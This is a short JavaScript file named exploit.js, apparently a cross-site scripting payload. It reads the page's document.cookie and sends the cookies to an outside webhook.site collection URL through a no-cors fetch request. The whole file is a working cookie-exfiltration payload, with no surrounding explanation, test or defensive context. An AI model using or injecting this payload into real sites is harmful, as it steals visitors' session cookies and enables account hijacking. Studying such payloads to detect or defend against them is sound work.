// exploit.js
(function() {
    var cookies = document.cookie;
    fetch("https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?cookies=" + encodeURIComponent(cookies), {
        method: "GET",
        mode: "no-cors"
    });
})();
